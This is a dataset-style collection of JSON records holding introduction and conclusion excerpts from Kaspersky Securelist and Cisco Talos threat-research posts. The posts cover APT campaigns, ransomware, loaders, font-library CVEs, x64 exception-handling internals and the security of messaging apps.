society, security and entertainment. \nWe believe that now is still a good time for world leaders, international and regional organizations, the private sector, the technical community and civil society to collaborate on achieving long-term peace in cyberspace rather than focusing on the short-term interests of individual countries or private organizations. ", "source": "securelist"}, {"title": "Introduction", "content": "Angry Likho (referred to as Sticky Werewolf by some vendors) is an APT group we've been monitoring since 2023. It bears a strong resemblance to Awaken Likho, which we've analyzed before, so we classified it within the Likho malicious activity cluster. However, Angry Likho's attacks tend to be targeted, with a more compact infrastructure, a limited range of implants, and a focus on employees of large organizations, including government agencies and their contractors. Given that the bait files are written in fluent Russian, we infer that the attackers are likely native Russian speakers. \nWe've identified hundreds of victims of this attack in Russia, several in Belarus, and additional incidents in other countries. We believe that the attackers are primarily targeting organizations in Russia and Belarus, while the other victims were incidental-perhaps researchers using sandbox environments or exit nodes of Tor and VPN networks. \nAt the beginning of 2024, several cybersecurity vendors published reports on Angry Likho. However, in June, we detected new attacks from this group, and in January 2025, we identified malicious payloads ", "source": "securelist"}, {"title": "Victims", "content": "At the time of our investigation, our telemetry data showed hundreds of victims in Russia and several in Belarus. Most of the SFX archives had filenames and bait documents in Russian, thematically linked to government institutions in Russia. These institutions and their contractors are the primary targets of this campaign. ", "source": "securelist"}, {"title": "Attribution", "content": "We attribute this campaign to the APT group Angry Likho with a high degree of confidence. It shares certain similarities with findings from our colleagues at BI.ZONE and F6, as well as previous attacks by the group: \n1 The same initial implant structure (an archive with similar contents, sent in an email).   \n2 Similar bait documents with the same naming patterns and themes, mostly written in Russian.   \n3 Command files and AutoIt scripts used to install the implant are obfuscated similarly. Newer versions contain more sophisticated installation scripts, with extra layers of obfuscation to complicate analysis.   \n4 The implant described in this report contains a known payload-the Lumma stealer (TrojanPSW.Win32.Lumma). We have not previously seen this tool used in Angry Likho campaigns, but earlier attacks showed similar data exfiltration tactics, suggesting the group is still targeting cryptowallet files and user credentials. ", "source": "securelist"}, {"title": "Conclusion", "content": "We are continuing to monitor the activity of the Angry Likho APT, which targets Russian organizations. The group's latest attacks use the Lumma stealer, which collects a vast amount of data from infected devices, including browser-stored banking details and cryptowallet files. As before, the complex infection chain was contained in a self-extracting archive distributed via email. We believe that the attackers crafted spear-phishing emails tailored to specific users, attaching bait files designed to \nattract their interest. Additionally, we identified more malicious samples linked to this campaign based on common command servers and repositories. Let's sum up by highlighting the notable features of this campaign and other similar ones: \n1 The attack techniques remain relatively consistent over time, with only minor modifications. Despite this, the attackers are successfully achieving their objectives.   \n2 The attackers occasionally pause their activity, only to return with a new wave of attacks after a certain period.   \n3 The group relies on readily available malicious utilities obtained from darknet forums, rather than developing its own tools. The only work they do themselves is writing mechanisms of malware delivery to the victim's device and crafting targeted phishing emails. \nTo protect against such attacks, organizations need a comprehensive security solution that provides proactive threat hunting, 24/7 monitoring, and incident detection. Our product line for businesses helps identify and prevent attacks of any complexity at an early stage. The campaigns in this article rely on phishing emails as the initial attack vector, highlighting the importance of regular employee training and awareness programs for corporate security. ", "source": "securelist"}, {"title": "Introduction", "content": "05 JUN 2019 minute read \nIn June 2018, we came across an unusual set of samples spreading throughout South and Southeast Asian countries targeting diplomatic, government and military entities. The campaign, which may have started as far back as 2012, featured a multi-stage approach and was dubbed EasternRoppels. The actor behind this campaign, believed to be related to the notorious PLATINUM APT group, used an elaborate, previously unseen steganographic technique to conceal communication. \nAs a first stage the operators used WMI subscriptions to run an initial PowerShell downloader which, in turn, downloaded another small PowerShell backdoor. We collected many of the initial WMI PowerShell scripts and noticed that they had different hardcoded command and control (C&C) IP addresses, different encryption keys, salt for encryption (also different for each initial loader) and different active hours (meaning the malware only worked during a certain period of time every day). The C&C addresses were located on free hosting services, and the attackers made heavy use of a large number of Dropbox accounts (for storing the payload and exfiltrated data). The purpose of the PowerShell backdoor was to perform initial fingerprinting of a system since it supported a very limited set of commands: download or upload a file and run a PowerShell script. \nAt the time, we were investigating another threat, which we believe to be the second stage of the same campaign. We were able to find a backdoor that was implemented as a DLL and worked as a WinSock NSP (Nameservice Provider) to survive a reboot. The backdoor shares several features with the PowerShell backdoor described above: it has hardcoded active hours, it uses free domains as C&C addresses, etc. The backdoor also has a few very interesting features of its own. For example, it can hide all communication with its C&C server by using text steganography. \nAfter deeper analysis we realized that the two threats were related. Among other things, both attacks used the same domain to store exfiltrated data, and we discovered that some of the victims were infected by both types of malware at the same time. It's worth mentioning that in the second stage, all executable files were protected with a runtime crypter and after unpacking them we found another, previously undiscovered, backdoor that is known to be related to PLATINUM. \nOur paper only includes a description of the two previously undiscovered backdoors while the full report is available to customers of the Kaspersky Intelligence Reporting service (contact intelreports@kaspersky.com). ", "source": "securelist"}, {"title": "Conclusion", "content": "We have discovered a new attack by this group and noted that the actors are still working on improving their malicious utility and using new techniques for making the APT stealthier. A couple of years ago, we predicted that more and more APT and malware developers would use steganography, and here is proof: the actors used two interesting steganography techniques in this APT. One more interesting detail is that the actors decided to implement the utilities they need as one huge set \u2013 this reminds us of the framework-based architecture that is becoming more and more popular. Finally, based on the custom cryptor used by the actors, we have been able to attribute this attack to the notorious PLATINUM group, which means this group is still active. ", "source": "securelist"}, {"title": "Introduction", "content": "The previous Kaspersky research focused on a detailed analysis of the LockBit 3.0 builder leaked in 2022. Since then, attackers have been able to generate customized versions of the threat according to their needs. This opens up numerous possibilities for malicious actors to make their attacks more effective, since it is possible to configure network spread options and defense-killing functionality. It becomes even more dangerous if the attacker has valid privileged credentials in the target infrastructure. \nIn a recent incident response engagement, we faced this exact scenario: the adversary was able to get the administrator credential in plain text. They generated a custom version of the ransomware, which used the aforementioned account credential to spread across the network and perform malicious activities, such as killing Windows Defender and erasing Windows Event Logs in order to encrypt the data and cover its tracks. \nIn this article, we revisit the LockBit 3.0 builder files and delve into the adversary's steps to maximize impact on the network. In addition, we provide a list of preventive activities that can help network administrators to avoid this kind of threat. ", "source": "securelist"}, {"title": "Conclusion", "content": "Our examination of the LockBit 3.0 builder files shows the alarming simplicity with which attackers can craft customized ransomware, as evidenced by a recent incident where adversaries exploited administrator credentials to deploy a tailored ransomware variant. This underscores the need for robust security measures capable of mitigating this kind of threat effectively, as well as adoption of a cybersecurity culture among employees. \nKaspersky products detect the threat with the following verdicts: \nTrojan-Ransom.Win32.Lockbit.gen Trojan.Multi.Crypmod.gen Trojan-Ransom.Win32.Generic \nAnd the SessionGopher script, as: \nHackTool.PowerShell.Agent.l ", "source": "securelist"}, {"title": "Introduction", "content": "Kaspersky has continued to track the Roaming Mantis campaign. The group's attack methods have improved and new targets continuously added in order to steal more funds. The attackers' focus has also shifted to techniques that avoid tracking and research: allowlist for distribution, analysis environment detection and so on. We've also observed new malware families: Fakecop (also known as SpyAgent by McAfee) and Wroba.j (also known as Funkybot by Fortinet). ", "source": "securelist"}, {"title": "Conclusion", "content": "The Roaming Mantis actor is strongly motivated by financial gain and is eager to evade tracking by researchers. It is now employing yet another method \u2013 allowlisting \u2013 to achieve this. This new method is currently only being applied for Korean pages, but it's only a matter of time before it's implemented for other languages. \nThe actor is still very active in using SMiShing for Android malware distribution. This is particularly alarming, because it means all infected mobile devices could form a botnet for malware delivery, SMiShing, and so on. ISPs, together with security companies, need to keep a close eye on the Roaming Mantis campaign to understand how to combat it. ", "source": "securelist"}, {"title": "Introduction", "content": "On the Radar: Is 2022 the year encryption is doomed? \nBy Martin Lee \nTHURSDAY, MARCH 31, 2022 16:58 \nFEATURES ON THE RADAR \nQuantum technology in development by the world's superpowers will render many current encryption algorithms obsolete overnight. When it becomes available, whoever controls this technology will be able to read almost any encrypted data or message they wish. \nOrganizations need to take note that this technology is likely to be developed within the coming years. Senior managers responsible for information security should take stock of the encryption algorithms in use within their systems and plan their move to quantum-secure algorithms. \nThe AES-256 encryption algorithm is predicted to be quantum secure, as are the SHA-384 and SHA-512 hashing algorithms. As an interim solution, organizations should increase the key lengths of public-key algorithms to a minimum of 3,072 bits, to protect against attacks. \nSystems under development should be designed to implement AES-256, and to have the capability to swap out encryption algorithms if weaknesses are discovered, or more secure algorithms become available. \nQuantum computers already exist as proof-of-concept systems. For the moment, none are powerful enough to crack current encryption, but the private and public sectors are investing billions of dollars globally to create these powerful systems that will revolutionize computing. \nAlthough nobody knows when a powerful quantum computer will be available, we can predict the effects on security and prepare our defenses in advance. \nWhat is a quantum computer? \nClassical computers operate using bits of information. These bits exist in memory or in a processing chip register in one of two states, either '1' or '0'. Quantum computers operate in a different, but analogous, way. Instead of working with bits of information, quantum computers operate with \"qubits.\" A qubit exists in a mixed state which is both partly '1' and partly '0' at the same time, only adopting a '1' or '0' state at the point when it is measured. \nThis feature allows quantum computers to perform certain calculations much, much faster than current computers. The constraints of physics are making it harder to increase the processing power of current computing architectures, hence fuelling the interest in quantum physics as a path to develop a new generation of computers. ", "source": "Cisco"}, {"title": "Conclusion", "content": "Quantum computing is a major focus of research and investment. Physical constraints mean that current chip architectures are difficult to advance further. Practical quantum computer systems will bring large gains in computing power and allow new computational techniques to be applied to solve problems that are currently impractical to calculate. \nRELATED CONTENT \n\"There is no business school class that would ever sit down and design Talos\" J U LY 3 1 , 2 0 2 4 0 7 : 5 5 \nWe look back on 10 years of Talos, in multiple interviews with Talos' leaders. \nA (somewhat) complete timeline of Talos' history J U LY 2 4 , 2 0 2 4 0 6 : 0 0 \nRelive some of the major cybersecurity incidents and events that have shaped Talos over the past 10 years. \nBadgerboard: A PLC backplane network visibility module M A R C H 5 , 2 0 2 4 1 5 : 3 0 \nAnalysis of the traffic between networked devices has always been of interest since devices could even communicate with one another.  As the complexity of networks grew, the more useful dedicated traffic analysis tools became. Major advancements have been made over the years with tools like Snort or Wireshark, but these ", "source": "Cisco"}, {"title": "Introduction", "content": "By Earl Carter \nFRIDAY, FEBRUARY 5, 2016 15:32 \nVulnerabilities Discovered by Yves Younan of Cisco Talos. \nTalos is releasing an advisory for four vulnerabilities that have been found within the Libgraphite library, which is used for font processing in Linux, Firefox, LibreOffice, and other major applications. The most severe vulnerability results from an out-of-bounds read which the attacker can use to achieve arbitrary code execution. A second vulnerability is an exploitable heap overflow. Finally, the last two vulnerabilities result in denial of service situations. To exploit these vulnerabilities, an attacker simply needs the user to run a Graphite-enabled application that renders a page using a specially crafted font that triggers one of these vulnerabilities. Since Mozilla Firefox versions 11-42 directly support Graphite, the attacker could easily compromise a server and then serve the specially crafted font when the user renders a page from the server (since Graphite supports both local and server-based fonts). \nIn this post, we will discuss the following vulnerabilities: \nCVE-2016-1521   \nCVE-2016-1522   \nCVE-2016-1523 ", "source": "Cisco"}, {"title": "Conclusion", "content": "Finding and disclosing zero-day vulnerabilities responsibly helps improve the overall security of the devices and software people use on a day-to-day basis.  Talos is committed to this effort via developing programmatic ways to identify problems or flaws that could be otherwise exploited by malicious attackers. These developments help secure the platforms and software customers use and also help provide insight into how Cisco can improve its own processes to develop better products. To continually enhance their security posture, customers should always update the software that they use to the most recent versions to take advantage of the latest security updates. \nIn addition, Talos has released rules that detect attempts to exploit these vulnerabilities to protect our customers. Please note that additional rules may be released at a future date and current \nrules are subject to change pending additional vulnerability information. For the most current rule information, please refer to your Defense Center, FireSIGHT Management Center or Snort.org. Snort Rules: 36216,36213, 36217 36225-36228  36385-88   \nFor further zero day or vulnerability reports and information visit:   \nhttp://talosintel.com/vulnerability-reports/ \nSHARE THIS POST ", "source": "Cisco"}, {"title": "Introduction", "content": "By Edmund Brumaghin \nTHURSDAY, APRIL 23, 2020 11:37 \nRANSOMWARE \nBy Edmund Brumaghin, with contributions from Amit Raut. \nOverview \nMedusaLocker is a ransomware family that has been observed being deployed since its discovery in 2019. Since its introduction to the threat landscape, there have been several variants observed. However, most of the functionality remains consistent. The most notable differences are changes to the file extension used for encrypted files and the look and feel of the ransom note that is left on systems following the encryption process. \nWhile most of MedusaLocker's functionality is consistent with other modern ransomware families, there are features that set MedusaLocker apart from many of the other ransomware families commonly observed. \nMedusaLocker can encrypt the contents of mapped network drives that may be present on infected systems.   \nIt manipulates Windows functionality to force network drives to be remapped so that their contents can also be encrypted.   \nThe malware uses ICMP sweeping to profile the network to identify other systems that can be used to maximize the likelihood of a ransom payment. \nMedusaLocker can also perform ICMP sweeping to identify other systems on the same network. If the malware is able to locate them, MedusaLocker then attempts to leverage the SMB protocol to discover accessible network locations and if files are discovered in those locations, they are also encrypted and ransomed in the same manner as other locally stored data. ", "source": "Cisco"}, {"title": "Conclusion", "content": "Organizations should be prepared to defend against this and other ransomware attacks. The emergence of \"big game hunting\" has proven that simply having backup and recovery strategies is not enough. Organizations should also leverage a robust defense-in-depth strategy to protect their environments from malware such as MedusaLocker. Ransomware developers continue to add functionality that enables them to maximize the damage they can inflict upon corporate networks in an effort to increase the likelihood of receiving a ransom payment from victims. This trend is likely to continue, and organizations should have response and recovery plans in place to ensure that they can resume normal operations following destructive attacks such as this. \nCoverage \nWays our customers can detect and block this threat are listed below. \nAdvanced Malware Protection (AMP) is ideally suited to prevent the execution of the malware used by these threat actors. Exploit Prevention present within AMP is designed to protect customers from unknown attacks such as this automatically. \nCisco Cloud Web Security (CWS) or Web Security Appliance (WSA) web scanning prevents access to malicious websites and detects malware used in these attacks. \nCisco AMP users can use Orbital Advanced Search to run complex OSqueries to see if their endpoints are infected with this specific threat. For specific OSqueries on this threat, click here. \nEmail Security can block malicious emails sent by threat actors as part of their campaign. \nNetwork Security appliances such as Next-Generation Firewall (NGFW), Next-Generation Intrusion Prevention System (NGIPS), Cisco ISR, and Meraki MX. \nAMP Threat Grid helps identify malicious binaries and build protection into all Cisco Security products. \nUmbrella, our secure internet gateway (SIG), blocks users from connecting to malicious domains, IPs, and URLs, whether users are on or off the corporate network. \nOpen Source Snort Subscriber Rule Set customers can stay up to date by downloading the latest rule pack available for purchase on Snort.org. The following SIDs have been released to detect this threat: 53662-53665. ", "source": "Cisco"}, {"title": "Introduction", "content": "Over the last several months Talos researchers have been monitoring a massive exploit kit campaign that is utilizing hijacked registrant accounts to create large amounts of subdomains for both initial redirection and exploitation. This campaign has been largely attributed to Angler Exploit Kit with fileless exploits serving various malicious payloads. \nThe use of hijacked accounts lead to a larger research project into the use of hijacked registrant accounts. During this research the earliest examples were found from a 2011 campaign with sporadic usage until December 2014. Since December 2014 more than 75% of the subdomain activity has occurred indicating a major shift in approach. This behavior has been covered before which discussed some of the older campaigns as well as the hosting indicators (ASN) of the groups making use of the subdomains. ", "source": "Cisco"}, {"title": "Detection", "content": "Detection of exploit kit campaigns using this technique is difficult due to the steps taken to avoid the more common detection methods. This again emphasizes the importance of a true defense in depth approach to security as some of the typical detection techniques will not succeed with this attack. The subdomains and IP's being used are changing regularly so typical blacklisting isn't nearly as effective as it would be normally. The actual samples being served are being morphed frequently which has hindered AV detection significantly (many samples with low \ndetection). The keys to detection rely largely on NGIPS and advanced heuristic based malware detection. Most of these exploit attempts will trigger multiple NGIPS rules for generic Adobe Flash exploits, generic Silverlight exploits, and landing page detection. Additionally heuristic based malware detection software will detect the exploitation attempts as well as the post exploitation behavior. \nThere are a couple of other types of detection that may be effective against this threat. Looking for multiple subdomains resolving for a single second level domain. Additionally looking for multiple subdomains resolving to a single IP address. Finally looking for random string subdomains could be effective as well. However, this does present some challenges as there are lots of legitimate services especially cloud based hosting that make use of quasi-random subdomains causing high FP rates. \nIOC \nHashes   \nSubdomains (Recent) IP Addresses   \nSubdomains (All Time) ", "source": "Cisco"}, {"title": "Conclusion", "content": "Users are at risk for these types of attacks because they are designed to evade detection and prevention. A malicious ad can be hosted on virtually any website causing compromise. These random domains that are hosting the exploits are difficult to identify and anticipate. This coupled with 0-day attacks has shown to be an extremely successful methodology with compromise. This particular campaign is unique in its large-scale use of Domain Shadowing. \nThe process of Domain Shadowing is effective not only because it makes blacklisting difficult but also leverages that most users only login to their domain registrar to renew the registration. This threat example clearly demonstrates the ongoing evolution of threat actors. Actors are always going to try and stay ahead of detection technologies, and increasingly the researchers. \nThis latest campaign has successfully elevated Angler to an advanced exploit kit. One that utilizes 0-day's and evasion techniques that were previously associated with advanced threats alone.  At this point its more a question of \"when\" Angler will affect you instead of \"if\".  If you are relying exclusively on blacklisting technologies, this threat is designed to beat it. Utilizing multiple products with different inspection engines can help ensure the most comprehensive coverage before, during, and after the attack. \nAngler-related Snort Rules: 28613-28616, 29066, 29411-29414, 30852, 31046, 31129-31330, 31331-31332, 31370-31372, 31694, 31695, 31898-31901, 32390, 32399, 33182-33187, 33271- 33274, 33286,33292 \nFor the most up-to-date list, please refer to Defense Center or FireSIGHT Management Center. ", "source": "Cisco"}, {"title": "Introduction", "content": "By Andrea Allievi \nTHURSDAY, JUNE 26, 2014 13:37 \nIn my last post, you may remember how the latest Uroburos rootkit was able to disarm Patchguard on Windows 7 . I was recently looking into how Patchguard is implemented in Windows 8.1 and decided to dig into Exception Handling on x64. As a matter of fact, all the new 64-bit Windows operating systems have entirely changed the way they manage error conditions from their state in older 32-bit versions of Windows (C++ exceptions and OS Structured Exception handling). There are a lot of papers available on 64-bit Windows exception handling on the web, but I decided to increase my knowledge on this topic with the goal to understand how it is implemented and to correctly characterize some strange behavior associated with the implementation of Patchguard on Windows 8.1. \nHere are some interesting articles that can be found online: \n1. Exceptional Behavior - x64 Structured Exception Handling - OSR Online. The NT Insider, Vol 13, Issue 3, 23 June 2006.   \n2. Skape, Improving Automated Analysis of Windows x64 Binaries - Uninformed, June 2006. A great article from Matt Miller   \n3. Johnson, Ken. \" Programming against the x64 exception handling support .\" - Nynaeve. N.p., 5 Feb. 2007. A very good serie of articles that deals with Windows Vista x64 SEH \nimplementation written by Ken Johnson (Skywing) \nI strongly recommend that all the readers check out these 3 papers. I won't be rehashing any of the work there. \nI will also assume that the reader already knows how Windows Structured Exception Handling and C++ exceptions handling can be exploited to manage errors conditions. If not, I personally recommend the following book that explains very well how this is done: \nRichter, Jeffrey, and Christophe Nasarre. Windows via C/C++ . Redmond, WA: Microsoft, 2007 ", "source": "Cisco"}, {"title": "Introduction", "content": "As the 3 articles mentioned above explain, x64 exception handling is not stack-based. Therefore, a lot of Structured Exception Handling (SEH) attacks have became ineffective against 64 bit binaries. 64-bit Windows Portable Executables (PE) have what is called the \"Exception Directory data directory\". This directory implements the 64-bit version of exception handling. It's the compiler's duty to add the relative RUNTIME_FUNCTION structure in the exception directory for each chunk of code directly or indirectly involved with exception handling. Here's what this structure looks like: \ntypedef struct _RUNTIME_FUNCTION { DWORD BeginAddress; // Start RVA of SEH code chunk DWORD EndAddress; // End RVA of SEH code chunk DWORD UnwindData; // Rva of an UNWIND_INFO structure that describes this code frame } RUNTIME_FUNCTION, \\*PRUNTIME_FUNCTION; \nEach runtime function points to an UNWIND_INFO structure that describes one of the most important feature of Windows error handling: the Frame Unwind. Before I describe what frame unwinding is, let's take a look at the key structures related to the stack unwind (the \"UnwindData\" member of the RUNTIME_FUNCTION structure points to a UNWIND_INFO ): \n// Unwind info flags #define UNW_FLAG_EHANDLER 0x01 #define UNW_FLAG_UHANDLER 0x02 #define UNW_FLAG_CHAININFO 0x04 \n// UNWIND_CODE 3 bytes structure   \ntypedef union _UNWIND_CODE { struct { UBYTE CodeOffset; UBYTE UnwindOp : 4; UBYTE OpInfo : 4; }; USHORT FrameOffset;   \n} UNWIND_CODE, \\*PUNWIND_CODE;   \ntypedef struct _UNWIND_INFO { UBYTE Version : 3; // + 0x00 - Unwind info structure version UBYTE Flags : 5; // + 0x00 - Flags (see above) UBYTE SizeOfProlog; // + 0x01 UBYTE CountOfCodes; // + 0x02 - Count of unwind codes UBYTE FrameRegister : 4; // + 0x03 UBYTE FrameOffset : 4; // + 0x03 UNWIND_CODE UnwindCode[1];  // + 0x04 - Unwind code array UNWIND_CODE MoreUnwindCode[((CountOfCodes + 1) & \\~1) - 1]; union { OPTIONAL ULONG ExceptionHandler; // Exception handler routine OPTIONAL ULONG FunctionEntry; }; OPTIONAL ULONG ExceptionData[]; // C++ Scope table structure UNWIND_INFO, \\*PUNWIND_INFO; \nThe compiler produces a RUNTIME_FUNCTION structure (and the related unwind info data) for almost all procedures directly or indirectly related with SEH (or C++ exceptions). The only exception, as outlined in \" Programming against the x64 exception handling support.\", is for the leaf functions: these functions are not enclosed in any SEH blocks, don't call other subfunctions and make no direct modifications to the stack pointer (this is very important). \nLet's assume that a parent function surrounded by a __try__except block calls another function from its __try code block. When an exception occurs in the unprotected sub function, a stack unwinding occurs. The Windows kernel MUST indeed be able to restore the original context and find the value of the RIP register (instruction pointer) from before the call to the sub function had occurred (or a call to a function that subsequently jumps to the leaf function). This procedure of unwinding the stack is called Frame Unwind. The result of Frame Unwind is that the state of the key registers, including the stack, are restored to the same state as before the call to the exception-causing function. This way, Windows can securely detect if an exception handler (or terminator handle) is present, and subsequently call it if needed. The frame unwind process is the key feature of the entire error management. The unwind process is managed in the Windows kernel and can be used even in other ways (take a look at RtlVirtualUnwind kernel function, which is highlighted in Programming against the x64 exception handling support). ", "source": "Cisco"}, {"title": "Conclusion", "content": "In this blog post we took a hard look at the implementation of the Windows 8.1 64-bit Structured Exception handling. We even analysed one of the most important concepts related to SEH: the stack unwind process, and two of its particular cases. The implementation of the last case, the so called \"Collided unwind\", is very important for the Windows 8.1 Kernel, because the Kernel Patch Protection feature uses it heavily, rendering its analysis much more complicated. \nIn the next blog post we will talk about how Patchguard is implemented in Windows 8.1. I'll also go over how the Uroburos rootkit defeated Patchguard in Windows 7 and how those techniques no longer work on Windows 8.1. Stay tuned! ", "source": "Cisco"}, {"title": "Introduction", "content": "By Asheer Malhotra, Vitor Ventura, Arnaud Zobec \nTHURSDAY, MARCH 10, 2022 08:02\nTHREAT SPOTLIGHT\nCisco Talos has observed new cyber attacks targeting Turkey and other Asian countries we believe with high confidence are from groups operating under the MuddyWater umbrella of \nAPT groups. U.S. Cyber Command recently connected MuddyWater to Iran's Ministry of Intelligence and Security (MOIS).   \nThese campaigns primarily utilize malicious documents (maldocs) to deploy downloaders and RATs implemented in a variety of languages, such as PowerShell, Visual Basic and JavaScript.   \nAnother new campaign targeting the Arabian peninsula deploys a WSF-based RAT we're calling \"SloughRAT\", identified as an implant called \"canopy\" by CISA in their advisory released in late February.   \nBased on a review of multiple MuddyWater campaigns, we assess that the Iranian APT is a conglomerate of multiple teams operating independently rather than a single threat actor group.   \nThe MuddyWater supergroup is highly motivated and can use unauthorized access to conduct espionage, intellectual property theft and deploy ransomware and destructive malware in an enterprise. ", "source": "Cisco"}, {"title": "Conclusion", "content": "Cisco Talos has observed Iranian APT groups conducting malicious operations and activities all over the world for years. Particularly, 2021 was prolific in cybersecurity incidents for Iran where state-run organizations were targeted. These events were attributed to Western nations by the Iranian regime, with the promise of revenge. It's hard to say if these campaigns are the result of such promises or just part of these groups' usual activity. However, the fact that they have changed some of their methods of operation and tools is yet another sign of their adaptability and unwillingness to refrain themselves from attacking other nations. \nWe believe there are links between these different campaigns, including the migration of techniques from region to region, along with their evolution into more advanced versions. Overall, the campaigns we describe cover Turkey, Pakistan, Armenia and countries from the Arabian peninsula. While they share certain techniques, these campaigns also denote individuality in the way they were conducted, indicating the existence of multiple sub-teams beneath the Muddywater umbrella - all sharing a pool of tactics and tools to pick and choose from. \nIn-depth defense strategies based on a risk analysis approach can deliver the best results in protecting against such a highly motivated set of threat actors. However, this should always be complemented by a good incident response plan which has not only been tested with table top exercises, but also reviewed and improved every time it is put to the test on real engagements. \nCoverage \nWays our customers can detect and block this threat are listed below. \nCisco Secure Endpoint (formerly AMP for Endpoints) is ideally suited to prevent the execution of the malware detailed in this post. Try Secure Endpoint for free here. \nCisco Secure Web Appliance web scanning prevents access to malicious websites and detects malware used in these attacks. \nCisco Secure Email (formerly Cisco Email Security) can block malicious emails sent by threat actors as part of their campaign. You can try Secure Email for free here. \nCisco Secure Firewall (formerly Next-Generation Firewall and Firepower NGFW) appliances such as Threat Defense Virtual, Adaptive Security Appliance and Meraki MX can detect malicious activity associated with this threat. \nCisco Secure Network/Cloud Analytics (Stealthwatch/Stealthwatch Cloud) analyzes network traffic automatically and alerts users of potentially unwanted activity on every connected device. \nCisco Secure Malware Analytics (Threat Grid) identifies malicious binaries and builds protection into all Cisco Secure products. \nUmbrella, Cisco's secure internet gateway (SIG), blocks users from connecting to malicious domains, IPs and URLs, whether users are on or off the corporate network. Sign up for a free trial of Umbrella here. \nCisco Secure Web Appliance (formerly Web Security Appliance) automatically blocks potentially dangerous sites and tests suspicious sites before users access them. \nAdditional protections with context to your specific environment and threat data are available from the Firewall Management Center. \nCisco Duo provides multi-factor authentication for users to ensure only those authorized are accessing your network. \nOpen-source Snort Subscriber Rule Set customers can stay up to date by downloading the latest rule pack available for purchase on Snort.org. \nSnort rules for protection against this threat are: 59226 - 59230. ", "source": "Cisco"}, {"title": "Introduction", "content": "By Sean Baird, Earl Carter, Erick Galinkin, Christopher Marczewski, Joe Marshall \nFRIDAY, JULY 7, 2017 16:34 \nTHREAT ADVISORY \nExecutive Summary \nAttackers are continually trying to find new ways to target users with malware sent via email. Talos has identified an email-based attack targeting the energy sector, including nuclear power, that puts a new spin on the classic word document attachment phish. Typically, malicious Word documents that are sent as attachments to phishing emails will themselves contain a script or macro that executes malicious code. In this case, there is no malicious code in the attachment itself. The attachment instead tries to download a template file over an SMB connection so that the user's credentials can be silently harvested. In addition, this template file could also potentially be used to download other malicious payloads to the victim's computer. ", "source": "Cisco"}, {"title": "Background", "content": "Since at least May 2017, Talos has observed attackers targeting critical infrastructure and energy companies around the world, primarily in Europe and the United States. These attacks target both the critical infrastructure providers, and the vendors those providers use to deliver critical services. Attacks on critical infrastructure are not a new concern for security researchers, as adversaries are keen to understand critical infrastructure ICS networks for reasons unknown, but surely nefarious. \nOne objective of this most recent attack appears to be to harvest credentials of users who work within critical infrastructure and manufacturing industries. Using a new twist on an old attack method, a clever adversary stole credentials from their victims by sending malicious word documents via email. These documents when opened, attempt to retrieve a template file from an attacker controlled external SMB server. ", "source": "Cisco"}, {"title": "Conclusion", "content": "Talos responded to these attacks by reaching out to known affected customers and ensuring that they were aware of and capable of responding to the threat. It also illustrates the importance of controlling your network traffic and not allowing outbound protocols such as SMB except where specifically required for your environment. Additionally, a number of ClamAV signatures and email rules were written in order to ensure that threats leveraging this Office template injection technique are blocked in the future. \nCoverage \nClamAV signatures created to identify this attack: \nDoc.Tool.Phishery-6331699-0   \nDoc.Downloader.TemplateInjection-6332119-0   \nDoc.Downloader.TemplateInjection-6332123-0 \nAdditional ways our customers can detect and block this threat are listed below. \nAdvanced Malware Protection (AMP) blocks the malicious word documents used by these threat actors. \nCWS,WSA, andUmbrella can help identify outbound connections used by these threat actors. Email Security can block malicious emails sent by threat actors as part of their campaign. AMP Threat Grid helps identify malicious binaries and builds protection into all Cisco Security products. ", "source": "Cisco"}, {"title": "Introduction", "content": "Cisco Talos has been tracking a new version of Smoke Loader - a malicious application that can be used to load other malware - for the past several months following an alert from Cisco Advanced Malware Protection's (AMP) Exploit Prevention engine. AMP successfully stopped the malware \nhttps://blog.talosintelligence.com/smoking-guns-smoke-loader-learned-new/ before it was able to infect the host, but further analysis showed some developments in the Smoke Loader sample resulting from this chain of malware that intrigued us. This includes one of the first uses of the PROPagate injection technique in real-world malware. Besides a report released at the end of last week describing a different RIG Exploit Kit-based campaign, we haven't seen real-world malware using this. \nTalos is very familiar with Smoke Loader. For example, it was used as a downloader for a cyberattack that was launched using the official website of Ukraine-based accounting software developer Crysta Finance Millennium (CFM) in January. \nSimilar to many other campaigns, the initial infection vector was an email with a malicious Microsoft Word document attached. The victims were tricked into opening the attachment and enabling the embedded macros. This started the malware-downloading chain, down to the final Smoke Loader infection and its plugins. \nSmoke Loader is primarily used as a downloader to drop and execute additional malware like ransomware or cryptocurrency miners. Actors using Smoke Loader botnets have posted on malware forums attempting to sell third-party payload installs. This sample of Smoke Loader did not transfer any additional executables, suggesting that it may not be as popular as it once was, or it's only being used for private purposes. \nThe plugins are all designed to steal sensitive information from the victim, specifically targeting stored credentials or sensitive information transferred over a browser - including Windows and Team Viewer credentials, email logins, and others. ", "source": "Cisco"}, {"title": "Conclusion", "content": "We have seen that the trojan and botnet market is constantly undergoing changes. The players are continuously improving their quality and techniques. They modify these techniques on an ongoing basis to enhance their capabilities to bypass security tools. This clearly shows how important it is to make sure all our systems are up to date. Organizations can utilize a multi-layered defensive approach to detect and protect against these kinds of threats. Talos continues to monitor these campaigns as they evolve to ensure that defenses protect our customers. We strongly encourage users and organizations to follow recommended security practices, such as installing security patches as they become available, exercising caution when receiving messages from unknown third parties, and ensuring that a robust offline backup solution is in place. These practices will help reduce the threat of a compromise and should aid in the recovery of any such attack. \nCoverage \nAdditional ways our customers can detect and block this threat are listed below. ", "source": "Cisco"}, {"title": "Introduction", "content": "By Vitor Ventura \nMONDAY, DECEMBER 10, 2018 11:51 \nThis blog post is authored by Vitor Ventura. \nExecutive summary https://blog.talosintelligence.com/secureim/ \nMessaging applications have been around since the inception of the internet. But recently, due to the increased awareness around mass surveillance in some countries, more users are installing end-to-end encrypted apps dubbed \"secure instant messaging applications.\" These apps claim to encrypt users' messages and keep their content secure from any third parties. \nHowever, after a deep dive into three of these secure messaging apps - Telegram, WhatsApp and Signal - we discovered that these services may not fulfill the promises they are meant to keep by putting users' confidential information at risk. \nThis is a serious problem, considering users download these apps in the hopes that their photos and messages will stay completely protected from third parties. These apps, which have countless users, cannot assume that their users are security educated and understand the risk of enabling certain settings on their device. As such, they have an obligation to explain the risks to users, and when possible, adopt safer defaults in their settings. In this post, we will show how an attacker could compromise these applications by performing side-channel attacks that target the operating system these apps delegated their security to. This post will dive into the methods in which these apps handle users' data. It will not include deep technical analysis of these companies' security. ", "source": "Cisco"}, {"title": "Conclusion", "content": "Secure instant messaging applications have a solid track record of protecting the information while in transit, even going as far as protecting the information from their own servers. However, they fall short when it comes to protecting application state and user information, delegating this protection to the operating system. \nSignal 